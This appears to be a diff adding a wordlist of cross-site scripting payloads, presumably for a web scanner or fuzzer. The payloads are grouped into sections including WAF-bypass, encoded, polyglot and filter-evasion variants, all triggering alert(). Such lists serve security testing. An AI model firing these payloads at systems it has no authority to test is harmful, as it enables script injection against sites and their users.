@@ -1,0 +1,98 @@
+# XSS (Cross-Site Scripting) Payloads
+# One payload per line, comments start with #
+
+# ========================
+# Basic Payloads
+# ========================
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+
+# ========================
+# HTML5 Payloads
+# ========================
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<details/open/ontoggle=alert(1)>
+<summary ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data="javascript:alert(1)">
+
+# ========================
+# Event Handler Payloads
+# ========================
+<img src=x onerror="javascript:alert(1)">
+<div onmouseover="alert(1)">Hover me</div>
+<a href="javascript:alert(1)">Click me</a>
+<button onclick=alert(1)>Click</button>
+<p onmouseover=alert(1)>Text</p>
+
+# ========================
+# WAF Bypass Payloads
+# ========================
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<script >alert(1)</script >
+<script/src=data:,alert(1)>
+<img src=x oNeRrOr=alert(1)>
+<img src="x" ONERROR="alert(1)">
+<svg><script>alert(1)</script>
+<svg><script>alert&#40;1&#41;</script>
+<img src=`x` onerror=alert(1)>
+<img """><script>alert(1)</script>
+<<script>alert(1)</script>
+
+# ========================
+# Encoded Payloads
+# ========================
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+&#60;script&#62;alert(1)&#60;/script&#62;
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+
+# ========================
+# JavaScript Context Payloads
+# ========================
+';alert(1)//
+";alert(1)//
+\';alert(1)//
+\";alert(1)//
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+
+# ========================
+# Polyglot Payloads
+# ========================
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'>"><img src=x onerror=alert(1)>
+--><img src=x onerror=alert(1)>
+</style></script><img src=x onerror=alert(1)>
+
+# ========================
+# DOM-based Payloads
+# ========================
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+javascript:alert(1)
+javascript:void(alert(1))
+
+# ========================
+# Filter Evasion
+# ========================
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert(1337)>
+<img src=x onerror=(alert)(1)>
+<script>window['alert'](1)</script>
+<script>top['alert'](1)</script>
+<svg onload="al\u0065rt(1)">
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
